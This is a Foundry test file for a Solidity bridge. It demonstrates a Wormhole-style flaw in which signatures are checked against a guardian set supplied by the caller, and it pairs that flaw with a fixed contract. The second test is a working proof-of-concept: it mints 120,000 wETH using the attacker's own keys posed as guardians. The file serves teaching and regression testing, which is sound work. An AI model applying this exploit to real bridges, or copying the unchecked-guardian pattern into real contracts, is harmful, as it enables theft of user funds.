// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./Bridge.sol";
import "./BridgeFixed.sol";

contract WormholeTest is Test {
    // 3 real guardians (sorted by address), quorum 2. Wormhole used 19 & 13; the bug is identical.
    uint256[] gpk; address[] guardians;
    uint256[] apk; address[] attackerSet;        // the attacker's OWN keys, posed as "guardians"
    uint256 constant QUORUM = 2;
    address user = address(0xBEEF);
    address attacker = address(0xA11CE);

    function _sortPairs(uint256[] memory keys) internal pure returns (uint256[] memory, address[] memory) {
        uint256 n = keys.length; address[] memory ad = new address[](n);
        for (uint256 i; i < n; i++) ad[i] = vm.addr(keys[i]);
        for (uint256 i; i < n; i++) for (uint256 j; j + 1 < n - i; j++)
            if (ad[j] > ad[j+1]) { (ad[j],ad[j+1])=(ad[j+1],ad[j]); (keys[j],keys[j+1])=(keys[j+1],keys[j]); }
        return (keys, ad);
    }
    function setUp() public {
        uint256[] memory gk = new uint256[](3); gk[0]=11; gk[1]=12; gk[2]=13;
        address[] memory ga; (gk, ga) = _sortPairs(gk);
        uint256[] memory ak = new uint256[](2); ak[0]=101; ak[1]=102;
        address[] memory aa; (ak, aa) = _sortPairs(ak);
        for (uint256 i;i<gk.length;i++){ gpk.push(gk[i]); guardians.push(ga[i]); }
        for (uint256 i;i<ak.length;i++){ apk.push(ak[i]); attackerSet.push(aa[i]); }
    }
    function _sign(bytes32 d, uint256[] storage keys, uint256 k) internal view returns (bytes[] memory s) {
        s = new bytes[](k);
        for (uint256 i;i<k;i++){ (uint8 v,bytes32 r,bytes32 ss)=vm.sign(keys[i], d); s[i]=abi.encodePacked(r,ss,v); }
    }

    // ACT 1 — HONEST: 2 of 3 REAL guardians attest a legit 10-token deposit.
    function test_1_honest() public {
        Bridge b = new Bridge(guardians, QUORUM);
        bytes32 d = b.digest(user, 10 ether, 1);
        b.receiveAndMint(user, 10 ether, 1, guardians, _sign(d, gpk, QUORUM));
        emit log_named_decimal_uint("user minted (honest)", b.balanceOf(user), 18);
        assertEq(b.balanceOf(user), 10 ether);
    }

    // ACT 2 — ATTACK: signatures verified against the CALLER's set. Attacker passes their
    // OWN keys as "guardians" and mints 120,000 wETH out of thin air. No deposit. No bug in
    // the signatures — they're valid, just not from the real guardians.
    function test_2_attack() public {
        Bridge b = new Bridge(guardians, QUORUM);
        bytes32 d = b.digest(attacker, 120000 ether, 1);
        // claimedGuardians = the attacker's own addresses; sigs = the attacker's own sigs
        b.receiveAndMint(attacker, 120000 ether, 1, attackerSet, _sign(d, apk, QUORUM));
        emit log_named_decimal_uint("attacker MINTED (no deposit)", b.balanceOf(attacker), 18);
        assertEq(b.balanceOf(attacker), 120000 ether);
    }

    // ACT 3 — FIX: verify against the bridge's OWN stored guardians. The attacker's forged
    // VAA recovers to addresses that aren't guardians -> revert. Nothing minted.
    function test_3_fixed() public {
        BridgeFixed b = new BridgeFixed(guardians, QUORUM);
        bytes32 d = b.digest(attacker, 120000 ether, 1);
        vm.expectRevert(bytes("not a guardian"));
        b.receiveAndMint(attacker, 120000 ether, 1, _sign(d, apk, QUORUM));
        emit log_named_decimal_uint("attacker minted (fixed)", b.balanceOf(attacker), 18);
        assertEq(b.balanceOf(attacker), 0);
    }
}
